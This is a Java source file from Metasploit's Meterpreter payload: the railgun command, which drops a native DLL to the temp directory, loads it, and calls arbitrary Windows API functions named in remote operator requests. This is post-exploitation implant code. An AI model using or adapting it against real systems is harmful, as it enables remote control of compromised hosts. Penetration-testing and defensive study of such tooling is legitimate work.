package com.metasploit.meterpreter.stdapi;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

import java.io.*;
import java.util.Arrays;

public class stdapi_railgun_api implements Command {
    static void ExtractLibFromJar()
    {
        try
        {
            InputStream inputStream = stdapi_railgun_api.class.getResourceAsStream("/railgunLib.dll");
            String tempDir = System.getProperty("java.io.tmpdir");
            File outputFile = new File(tempDir + "railgunLib.dll");
            if (outputFile.exists())
            {
                outputFile.delete();
            }
            outputFile.createNewFile();
            outputFile.deleteOnExit();

            byte[] b = new byte[1024];
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            int c;
            while ((c = inputStream.read(b)) != -1) {
                os.write(b, 0, c);
            }

            FileOutputStream fos = new FileOutputStream(outputFile);
            fos.write(os.toByteArray());

            inputStream.close();
            os.close();
            fos.close();
        }
        catch (Exception e)
        {
            System.out.println(e.getMessage());
        }
    }

    static void LoadLib()
    {
        try
        {
            // We use System.load as it allows us to specify the library directory as the dll file would be extracted to the temp dir.
            File path = new File(System.getProperty("java.io.tmpdir") + "railgunLib.dll");
            System.load(path.getAbsolutePath());
        }
        catch (Throwable e)
        {
            e.printStackTrace();
            System.out.println("Message: " + e.getMessage());
        }
    }

    static
    {
        // HOW TO GENERATE:
        // If in the directory of this file:
        // Create the header file:
        // (On Windows): javac -cp ../../../../../../../../meterpreter/src/main/java;../../../../../../../../shared/src/main/java;../../../../../../../../../javapayload/src/main/java -h . stdapi_railgun_api.java
        // As this library is for windows only, compile this on x64 windows:
        // g++ -m64 -DARCH_X86_64=1 -c -I%JAVA_HOME%\include -I%JAVA_HOME%\include\win32 com_metasploit_meterpreter_stdapi_stdapi_railgun_api.c -o com_metasploit_meterpreter_stdapi_stdapi_railgun_api.o
        // Create the lib:
        // g++ -shared -o railgunLib.dll com_metasploit_meterpreter_stdapi_stdapi_railgun_api.o -Wl,--add-stdcall-alias
        // Then compile the meterpreter.jar

        ExtractLibFromJar();
        LoadLib();
    }

    public native void railgunCaller(int sizeOut, byte[] stackBlobIn, byte[] bufferBlobIn, byte[] bufferBlobInOut, String libName, String funcName, String callConv, byte[] bufferBlobOut, int[] errorCode, String errorMessage, long[] returnValue);

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        final int sizeOut = request.getIntValue(TLVType.TLV_TYPE_RAILGUN_SIZE_OUT);
        byte[] stackBlob = request.getRawValue(TLVType.TLV_TYPE_RAILGUN_STACKBLOB);
        final byte[] bufferBlobIn = request.getRawValue(TLVType.TLV_TYPE_RAILGUN_BUFFERBLOB_IN);
        byte[] bufferBlobInOut = request.getRawValue(TLVType.TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT);
        byte[] bufferBlobOut = new byte[sizeOut];
        final String libName = request.getStringValue(TLVType.TLV_TYPE_RAILGUN_LIBNAME);
        final String funcName = request.getStringValue(TLVType.TLV_TYPE_RAILGUN_FUNCNAME);
        final String callConv = request.getStringValue(TLVType.TLV_TYPE_RAILGUN_CALLCONV);

        // To change primite types in C land and get the changed values out into Java land,
        // We need to store them in an array.
        int[] errorCode = {0};
        String errorMessage = "";
        long[] returnValue = {0};

        try
        {
            this.railgunCaller(sizeOut, stackBlob, bufferBlobIn, bufferBlobInOut, libName, funcName, callConv, bufferBlobOut, errorCode, errorMessage, returnValue);

            response.add(TLVType.TLV_TYPE_RAILGUN_BACK_ERR, errorCode[0]);
            response.add(TLVType.TLV_TYPE_RAILGUN_BACK_MSG, errorMessage);
            response.add(TLVType.TLV_TYPE_RAILGUN_BACK_RET, returnValue[0]);
            response.add(TLVType.TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_OUT, bufferBlobOut);
            response.add(TLVType.TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_INOUT, bufferBlobInOut);
        }
        catch (Throwable e)
        {
            e.printStackTrace();
            System.out.println("Message: " + e.getMessage());
            return ERROR_FAILURE;
        }

        return ERROR_SUCCESS;
    }
}
